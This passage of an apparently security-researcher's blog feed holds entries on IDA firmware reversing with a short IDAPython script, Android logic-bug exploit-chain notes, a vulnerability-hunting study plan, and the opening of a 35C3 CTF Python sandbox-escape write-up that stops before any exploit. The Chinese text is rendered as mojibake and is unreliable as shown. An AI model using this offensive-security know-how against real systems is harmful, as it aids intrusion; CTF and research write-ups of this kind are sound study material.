bit is zero..and the interupt vector addr after of the baseâ€¦so we guest the base addr is 0x1b000 ..so we try change base addr.</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144317.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144317.png"></a></p><p>set the value equal 0x1b000</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144340.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144340.png"></a></p><p>now ,these interrupt is functuon pointer:</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129150705.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129150705.png"></a></p><p>Next step ,we should restore code </p><p>use P and C hot-key..</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145126.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145126.png"></a></p><p>like this 0x10 data ,it maybe is <code>push</code> opcode so we press P to analysisâ€¦</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/1.gif" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/1.gif"></a></p><p>if we finish ,than we shoulde create some seg</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145832.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145832.png"></a></p><p>like this url <a href="https://www.youtube.com/watch?v=V6ZySLopflk">Setup and Find Entry-point in ARM Firmware - Hardware Wallet Research #4</a></p><p>å…ˆå†™åˆ°è¿™ã€‚ã€‚è¿˜åŸ seg æˆ‘å†™è„šæœ¬ æ¢å¤ä»£ç å»äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_addr_shoulde_P</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> Byte(i) == <span class="number">0x10</span>:</span><br><span class="line">        MakeFunction(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_addr_P</span>(<span class="params">va_start,va_end</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(va_start,va_end):</span><br><span class="line">        is_addr_shoulde_P(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    do_addr_P(<span class="number">0x01B5B4</span>,<span class="number">0x02B5B4</span>)</span><br></pre></td></tr></table></figure><p>run this script we got </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129154752.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129154752.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Building Exploit Chains with Logic Bugs</title>
      <link href="Building_xploit_Chains%20with_Logic_Bugs.html"/>
      <url>Building_xploit_Chains%20with_Logic_Bugs.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Building-Exploit-Chains-with-Logic-Bugs"><a href="#Building-Exploit-Chains-with-Logic-Bugs" class="headerlink" title="Building Exploit Chains with Logic Bugs"></a>Building Exploit Chains with Logic Bugs</h2><h3 id="Traditional-Approach"><a href="#Traditional-Approach" class="headerlink" title="Traditional Approach"></a>Traditional Approach</h3><p>â€¢Search for commonly misused methods</p><p>â€¢Class loading</p><p>â€¢Unzip path traversals</p><p>â€¢External storage operations</p><p>â€¢SSL error handling</p><p>â€¢Decompile APK</p><p>â€¢Is it used? Is it accessible? Is it vulnerable?</p><p>â€¢Repeat for each application on the device</p><h3 id="Process-Automation"><a href="#Process-Automation" class="headerlink" title="Process Automation"></a>Process Automation</h3><p>Which parts of the process can we automate? </p><p>â€¢ Is it used?<br>â€¢ Is it accessible? â€¢ Is it vulnerable? </p><p>â€¢ Wouldnâ€™t Joern solve this? â€¢ Code property graphs </p><p>â€¢ C/C++ only </p><p>â€¢ We need Joern for Android â€¢ Jandroid </p><h3 id="Automation-Overview"><a href="#Automation-Overview" class="headerlink" title="Automation Overview"></a>Automation Overview</h3><p>1.Find use of search term in the application</p><p>2.Find calls to this method</p><p>3.Find calls to these methods</p><p>4.Find any instances of methods exported in Manifest</p><p>åœ¨<a href="https://zh.wikipedia.org/wiki/Java%E5%B9%B3%E8%87%BA">Javaå¹³å°</a>ä¸­, <strong>æ¸…å•æ–‡ä»¶</strong>ï¼ˆManifest fileï¼‰æ˜¯<a href="https://zh.wikipedia.org/wiki/JAR_(%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F)">JARæ¡£æ¡ˆ</a>[<a href="https://zh.wikipedia.org/wiki/%E6%B8%85%E5%8D%95%E6%96%87%E4%BB%B6#cite_note-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/%E6%B8%85%E5%8D%95%E6%96%87%E4%BB%B6#cite_note-2">2]</a>ä¸­åŒ…å«çš„ç‰¹æ®Šæ–‡ä»¶ã€‚<strong>Manifest</strong>æ–‡ä»¶è¢«ç”¨æ¥å®šä¹‰æ‰©å±•æˆ–æ¡£æ¡ˆæ‰“åŒ…ç›¸å…³æ•°æ®ï¼Œæ˜¯ä¸€ä¸ª<a href="https://zh.wikipedia.org/wiki/%E5%85%83%E6%95%B0%E6%8D%AE">å…ƒæ•°æ®</a>æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†ä¸åŒéƒ¨åˆ†ä¸­çš„<a href="https://zh.wikipedia.org/w/index.php?title=%E5%90%8D/%E5%80%BC%E5%AF%B9&action=edit&redlink=1">å/å€¼å¯¹</a>æ•°æ®ã€‚å¦‚æœä¸€ä¸ªJARæ–‡ä»¶è¢«ç”¨æ¥ä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå…¶ä¸­çš„Manifestæ–‡ä»¶éœ€è¦æŒ‡å‡ºè¯¥ç¨‹åºçš„ä¸»ç±»æ–‡ä»¶ã€‚é€šå¸¸Manifestæ–‡ä»¶çš„æ–‡ä»¶åä¸º<code>MANIFEST.MF</code>ã€‚</p><p>é€šå¸¸Manifestæ–‡ä»¶éƒ½ä¸Javaæ¡£æ¡ˆç›¸å…³ï¼Œå…¶ä»–çš„æƒ…å†µæ¯”è¾ƒå°‘è§ã€‚</p><h3 id="Static-Analysis-at-Scale"><a href="#Static-Analysis-at-Scale" class="headerlink" title="Static Analysis at Scale"></a>Static Analysis at Scale</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190110013902.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190110013902.png"></a></p><p>è¿˜åœ¨é˜…è¯»ä¸­ï¼š</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> logic bugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The past year, the new year</title>
      <link href="The-past-year-the-new-year.html"/>
      <url>The-past-year-the-new-year.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="è¿‡å»çš„2018-å¹´"><a href="#è¿‡å»çš„2018-å¹´" class="headerlink" title="è¿‡å»çš„2018 å¹´"></a>è¿‡å»çš„2018 å¹´</h2><p> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114005424.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114005424.png"></a></p><h2 id="2019å¹´"><a href="#2019å¹´" class="headerlink" title="2019å¹´"></a>2019å¹´</h2><p>ä¸€ç‚¹å°è®¡åˆ’å§ï¼š</p><h3 id="1ã€ä»£ç å®¡è®¡è®­ç»ƒ"><a href="#1ã€ä»£ç å®¡è®¡è®­ç»ƒ" class="headerlink" title="1ã€ä»£ç å®¡è®¡è®­ç»ƒ"></a>1ã€ä»£ç å®¡è®¡è®­ç»ƒ</h3><p>æœ€è¿‘å…¬å¸æ¥äº†ä¸ªé¡¹ç›®ï¼Œé‡åˆ°äº†ä¸€æ¬¡åºå¤§çš„ä»£ç ï¼Œåœ¨è¿™ç§åºå¤§çš„ä»£ç é¢å‰æœ‰ç‚¹æ— ä»ä¸‹æ‰‹çš„æ„Ÿè§‰ã€‚ç®€å•æ‰“ç®—ï¼Œæ–°çš„ä¸€å¹´ï¼Œè¯»æ›´å¤šçš„ä»£ç ï¼Œå®¡æ›´å¤šçš„æ´ã€‚</p><p>ï¼ˆä»¥ä¸‹æ‘˜è‡ª riusksk æ³‰å“¥ å®‰å…¨ç ”ç©¶è€…çš„è‡ªæˆ‘ä¿®å…»ï¼‰</p><p>ï¼ˆ1ï¼‰æ ¹æ®è‡ªå·±ç›®æ ‡å®šä½ï¼Œå¯»æ‰¾ç›¸åº”çš„å†å²æ¼æ´æ¡ˆä¾‹è¿›è¡Œå­¦ä¹ ï¼Œæ¯”å¦‚è¦æchromeå°±æ‰¾chromeçš„å†å²æ¼æ´</p><p>ï¼ˆ2ï¼‰æŒæ¡æ¼æ´æ‰€åœ¨çš„æ¨¡å—æˆ–å­ç³»ç»Ÿï¼Œä½†ä¸çœ‹å®Œæ•´çš„æ¼æ´ç»†èŠ‚æè¿°ï¼Œå°è¯•åœ¨æ¼æ´ç‰ˆæœ¬ä¸­æ‰¾å‡ºå¯¹åº”çš„æ¼æ´</p><p>ï¼ˆ3ï¼‰å¦‚æœï¼ˆ2ï¼‰ä¸­æœªèƒ½æ‰¾å‡ºæ¼æ´ï¼Œå°±å»çœ‹æ¼æ´ç»†èŠ‚æè¿°ï¼Œå¯¹æ¯”è‡ªå·±çš„å®¡è®¡è¿‡ç¨‹ï¼Œçœ‹é—æ¼äº†å“ªä¸€æ­¥éª¤</p><p>ï¼ˆ4ï¼‰ä¸æ–­é‡å¤ä¸Šè¿°è®­ç»ƒï¼Œç›´è‡³ç›¸ä¿¡ï¼šæŒ–æ´åªæ˜¯ä½“åŠ›æ¶ˆè€—ï¼Œè€Œéèƒ½åŠ›é—®é¢˜</p><p>è¿™ç¬¬4ç‚¹è¯´å¾—ï¼Œéå¸¸åŠ±å¿—ï¼Œå› ä¸ºæŒ–æ´æŒ–ä¹…äº†ï¼Œæœ‰æ—¶çœŸçš„å®¹æ˜“æ€€ç–‘è‡ªå·±çš„èƒ½åŠ›ï¼Œç›®æ ‡éš¾åº¦è¶Šå¤§ï¼Œè¶Šå®¹æ˜“æ‰“å‡»äººã€‚</p><p>ä½œè€…ç¬¬ä¸€æ¬¡è®­ç»ƒçš„æ¼æ´æ˜¯j00ruï¼ˆProject Zeroæˆå‘˜ï¼‰çš„IDAæ¼æ´ï¼š<a href="https://j00ru.vexillium.org/2014/10/secure-2014-slide-deck-and-hex-rays-ida-pro-advisories-published/%EF%BC%8C2014%E5%B9%B4%E7%9A%84%E6%96%87%E7%AB%A0%E4%BA%86">https://j00ru.vexillium.org/2014/10/secure-2014-slide-deck-and-hex-rays-ida-pro-advisories-published/ï¼Œ2014å¹´çš„æ–‡ç« äº†</a></p><h3 id="2ã€è®­ç»ƒæŒ–æ´çš„åŒæŠ€èƒ½"><a href="#2ã€è®­ç»ƒæŒ–æ´çš„åŒæŠ€èƒ½" class="headerlink" title="2ã€è®­ç»ƒæŒ–æ´çš„åŒæŠ€èƒ½"></a>2ã€è®­ç»ƒæŒ–æ´çš„åŒæŠ€èƒ½</h3><p>ï¼ˆ1ï¼‰çœ‹æ´ï¼šå“ªé‡Œçœ‹ï¼Ÿå†å²æ¼æ´çš„git logã€bugæŠ¥å‘Šã€ä»£ç è´¨é‡æŠ¥å‘Šç­‰ç­‰</p><p>ï¼ˆ2ï¼‰è¯†æ´ï¼šå°±æ˜¯è‚‰çœ¼çœ‹ä»£ç æ‰¾æ¼æ´ï¼Œå³ä»£ç å®¡è®¡ï¼Œéš¾ç‚¹ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸Šé¢ï¼Œè®­ç»ƒæ–¹æ³•ç»§ç»­å¾€ä¸‹çœ‹</p><p>å…¶å®ï¼Œæˆ‘æ›´è®¤ä¸ºæˆ‘åº”è¯¥è®­ç»ƒæ‰¾æ´å’Œåˆ©ç”¨æ¼æ´çš„èƒ½åŠ›ï¼Œæ‰€ä»¥æˆ‘æ›´æƒ³å½’çº³ä¸º</p><p>ï¼ˆ1ï¼‰è¯†æ´ï¼š ä»git log ã€diff log æ‰¾åˆ°æ¼æ´ç‚¹ã€æ¼æ´åˆ©ç”¨ç‚¹ï¼Œä»æºä»£ç ã€åæ±‡ç¼–ã€è°ƒè¯•çš„è¿‡ç¨‹æ‰¾åˆ°æ¼æ´</p><p>ï¼ˆ2ï¼‰åˆ©ç”¨ï¼šå†™æ›´å¤šçš„exploit ï¼Œå†™æ›´å¤šæœ‰æ„æ€ ã€é«˜è´¨é‡çš„exploitï¼Œå¯ä»¥ä» cveã€0day ç»ƒä¹ èµ·æ¥ã€‚</p><p>æ–°å¹´ä¸ä»…æƒ³å®Œæˆå·¥ä½œä¸Šçš„å†…å®¹ï¼Œä¸šä½™æˆ‘è¿˜æƒ³è·Ÿè¸ªæœ€æ–°çš„ã€æœ‰æ„æ€çš„æ¼æ´ ï¼ˆå¦å¤–æƒ³å…¥å‘webkitäº†ï¼‰</p><h3 id="3ã€Fuzzingè®­ç»ƒ"><a href="#3ã€Fuzzingè®­ç»ƒ" class="headerlink" title="3ã€Fuzzingè®­ç»ƒ"></a>3ã€Fuzzingè®­ç»ƒ</h3><p>ï¼ˆ1ï¼‰æ‹¿å·²å…¬å¼€çš„å†å²æ¼æ´é—®è‡ªå·±ï¼šå¦‚ä½•å†™fuzzeræŒ–æ˜åˆ°æ­¤æ¼æ´ï¼Ÿ</p><p>ï¼ˆ2ï¼‰å¦‚æœè‡ªå·±ä¸çŸ¥é“æ­¤æ¼æ´ï¼Œé‚£åˆèƒ½å¤ŸæŒ–æ˜åˆ°å‘¢ï¼Ÿ</p><p>ï¼ˆ3ï¼‰ä¸æ–­é‡å¤è®­ç»ƒå¹¶æ”¹è¿›fuzzerï¼Œç›¸ä¿¡ä¼šæœ‰æ›´å¤šæ¼æ´è¢«æ„å¤–å‘ç°</p><h3 id="4ã€èƒ½åŠ›ï¼ˆåŸºç¡€ï¼‰å¾€å¾€æ¯”è¿æ°”å’Œå¤©èµ‹æ›´é‡è¦"><a href="#4ã€èƒ½åŠ›ï¼ˆåŸºç¡€ï¼‰å¾€å¾€æ¯”è¿æ°”å’Œå¤©èµ‹æ›´é‡è¦" class="headerlink" title="4ã€èƒ½åŠ›ï¼ˆåŸºç¡€ï¼‰å¾€å¾€æ¯”è¿æ°”å’Œå¤©èµ‹æ›´é‡è¦"></a>4ã€èƒ½åŠ›ï¼ˆåŸºç¡€ï¼‰å¾€å¾€æ¯”è¿æ°”å’Œå¤©èµ‹æ›´é‡è¦</h3><p>æ³‰å“¥åœ¨ä»–blogè¿™ä¹ˆå†™çš„ï¼š</p><p>åŠªåŠ›å¾€å¾€æ¯”è¿æ°”å’Œå¤©èµ‹æ›´é‡è¦</p><p>è™½ç„¶æŒ–æ´ä¹Ÿéœ€è¦ä¸€å®šè¿æ°”å’Œå¤©èµ‹ï¼Œä½†å¤šæ•°ä½ è®¤ä¸ºçš„æŒ–æ´å¤©æ‰ï¼Œå…¶å®åªä¸è¿‡æ˜¯èŠ±äº†æ¯”ä½ å¤š100å€ï¼Œç”šè‡³æ›´å¤šçš„æ—¶é—´åœ¨è¿™é¡¹æŠ€æœ¯ç ”ç©¶ä¸Šè€Œå·²</p><p>æˆ‘è®¤ä¸ºå‘¢ï¼š</p><p>æœ‰æ®µæ—¶é—´æ€»å¬åˆ°æœ‹å‹è¯´æŒ–åˆ°çš„æ´éƒ½æ˜¯è¿æ°”å¥½ï¼Œç„¶è€Œæˆ‘æƒ³çš„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„åŸºç¡€ã€æ²¡æœ‰è¶³å¤Ÿçš„æ„è¯†ã€å³ä½¿æœ‰ä¸ª0dayç ¸åˆ°ä½ å¤´ä¸Šï¼Œæˆ‘ä¹Ÿæœªå¿…èƒ½æ„è¯†åˆ°ã€‚æ‰€ä»¥åŠªåŠ›å§ã€å­¦ä¹ å§ï¼</p><h3 id="5ã€æ”¶é›†å’Œå­¦ä¹ å¼€æºçš„æ¼æ´æŒ–æ˜å·¥å…·"><a href="#5ã€æ”¶é›†å’Œå­¦ä¹ å¼€æºçš„æ¼æ´æŒ–æ˜å·¥å…·" class="headerlink" title="5ã€æ”¶é›†å’Œå­¦ä¹ å¼€æºçš„æ¼æ´æŒ–æ˜å·¥å…·"></a>5ã€æ”¶é›†å’Œå­¦ä¹ å¼€æºçš„æ¼æ´æŒ–æ˜å·¥å…·</h3><p>æ¯”å¦‚aflã€honggfuzzã€libfuzzerç­‰å¾ˆå¤šä¼˜ç§€çš„æ¼æ´æŒ–æ˜å·¥å…·ï¼Œéƒ½æ˜¯å€¼å¾—å¥½å¥½é˜…è¯»ä»£ç ï¼Œå­¦ä¹ å…¶ä¸­çš„fuzzingæ€è·¯ï¼Œå¯ä»¥æ›´å¥½åœ°åº”ç”¨åˆ°æœªæ¥çš„æ¼æ´æŒ–æ˜ç ”ç©¶ä¸Š</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>å¸Œæœ›18å¹´æ²¡æ‹¿åˆ°çš„cve ï¼Œåœ¨19å¹´èƒ½æ‹¿åˆ°ã€‚å¸Œæœ› 18å¹´æ²¡æœ‰æŒ–åˆ°æ´ï¼Œåœ¨19å¹´èƒ½æœ‰æ›´å¥½çš„äº§å‡ºã€‚å¸Œæœ›18å¹´é‚£ä¹ˆèœçš„è‡ªå·±ï¼Œ19å¹´è‡ªå·±èƒ½å˜å¾—æ›´å¼ºå§ã€‚æˆ‘ä¹Ÿæƒ³æˆä¸º master of pwné˜¿ï¼</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35C3 CTF 2018 - collection (pwn)</title>
      <link href="2018-353cCTF-2018-collection-pwn.html"/>
      <url>2018-353cCTF-2018-collection-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><a href="https://35c3ctf.ccc.ac/uploads/52ae03f0ae030a74a2bd466852308cba74c0f313.tar.gz">behold my collection</a></p><p>The container is built with the following important statements</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line">RUN apt-get -y install python3.6</span><br><span class="line">COPY build&#x2F;lib.linux-x86_64-3.6&#x2F;Collection.cpython-36m-x86_64-linux-gnu.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;dist-packages&#x2F;Collection.cpython-36m-x86_64-linux-gnu.so</span><br></pre></td></tr></table></figure><p>Copy the library in the same destination path and check that it works with</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.6 test.py</span><br></pre></td></tr></table></figure><p>Challenge runs at 35.207.157.79:4444</p><p>Difficulty: easy</p><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><p>é¢˜ç›®ç»™äº†python3.6 å’Œ Collection.cpython-36m-x86_64-linux-gnu.so è¿™ä¸¤ä¸ªæ¯”è¾ƒæœ‰ç”¨çš„æ–‡ä»¶ã€‚å…¶ä¸­ä»å‘½åæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ Collection.cpython-36m-x86_64-linux-gnu.so æ˜¯Cè¯­è¨€å†™çš„ä¸€ä¸ªPythonåº“ã€‚</p><p>åœ¨ Server.py æ–‡ä»¶é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¿™æ˜¯ä¸€ä¸ª Python escapeé¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from sys import modules</span></span><br><span class="line"><span class="string">del modules[&#x27;os&#x27;]</span></span><br><span class="line"><span class="string">import Collection</span></span><br><span class="line"><span class="string">keys = list(__builtins__.__dict__.keys())</span></span><br><span class="line"><span class="string">for k in keys:</span></span><br><span class="line"><span class="string">    if k != &#x27;id&#x27; and k != &#x27;hex&#x27; and k != &#x27;print&#x27; and k != &#x27;range&#x27;:</span></span><br><span class="line"><span class="string">        del __builtins__.__dict__[k]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size_max = <span class="number">20000</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;enter your code, enter the string END_OF_PWN on a single line to finish&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = prefix</span><br><span class="line">new = <span class="string">&quot;&quot;</span></span><br><span class="line">finished = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> size_max &gt; len(code):</span><br><span class="line">    new = raw_input(<span class="string">&quot;code&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> new == <span class="string">&quot;END_OF_PWN&quot;</span>:</span><br><span class="line">        finished = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    code += new + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> finished:</span><br><span class="line">    print(<span class="string">&quot;max length exceeded&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;/tmp/%s&quot;</span> % randstr()</span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.dup2(flag.fileno(), <span class="number">1023</span>)</span><br><span class="line">flag.close()</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;python3.6 -u %s&quot;</span> % file_name</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>ä»å…³é”®çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prefix = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from sys import modules</span></span><br><span class="line"><span class="string">del modules[&#x27;os&#x27;]</span></span><br><span class="line"><span class="string">import Collection</span></span><br><span class="line"><span class="string">keys = list(__builtins__.__dict__.keys())</span></span><br><span class="line"><span class="string">for k in keys:</span></span><br><span class="line"><span class="string">    if k != &#x27;id&#x27; and k != &#x27;hex&#x27; and k != &#x27;print&#x27; and k != &#x27;range&#x27;:</span></span><br><span class="line"><span class="string">        del __builtins__.__dict__[k]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œè¿™ä»–åˆ æ‰äº† os æ¨¡å—ï¼Œåªç•™ä¸‹äº† id ,hex ,print ,rangeã€‚æˆ‘ä»¬ç¬¬ä¸€æ€è·¯å°±æ˜¯ï¼Œçªç ´å£åœ¨ </p><p>Collection.cpython-36m-x86_64-linux-gnu.so è¿™ä¸ªæ‰©å±•åº“é‡Œã€‚äºæ˜¯æˆ‘ä»¬å…ˆå»é€†å‘è¿™ä¸ªæ–‡ä»¶</p><h2 id="å¯¹-Collection-é€†å‘"><a href="#å¯¹-Collection-é€†å‘" class="headerlink" title="å¯¹ Collection é€†å‘"></a>å¯¹ Collection é€†å‘</h2><p>æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ä¿ç•™äº†ç¬¦å·ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png"></a></p><p>ç”±äºæ˜¯ç”¨æ¥ä½œä¸ºPythonæ‰©å±•åº“ï¼Œæ–¹ä¾¿ç”¨æ¥ç›´æ¥ import æ‰€ä»¥ä¿ç•™ç¬¦å·åº”è¯¥æ˜¯å…¶ä¸€ä¸ªåŸå› ä¹‹ä¸€ã€‚ç”±äºä»¥å‰æ²¡æœ‰ç”¨Cå†™è¿‡Pythonçš„æ‰©å±•åº“ã€‚æ‰€ä»¥äº†è§£äº†ä¸€ä¸‹ï¼š</p><p><a href="https://docs.python.org/3/extending/building.html#building-c-and-c-extensions">Building C and C++ Extensions</a></p><p>ä»ä¸­æˆ‘ä»¬å¤§æ¦‚å¯ä»¥å¾—çŸ¥çš„æ˜¯ PyInit_Collectionåˆå§‹åŒ–<code>Collection</code>å°†è¦å®ç°çš„æ­¤ç±»å‹çš„è‡ªå®šä¹‰ç±»å‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 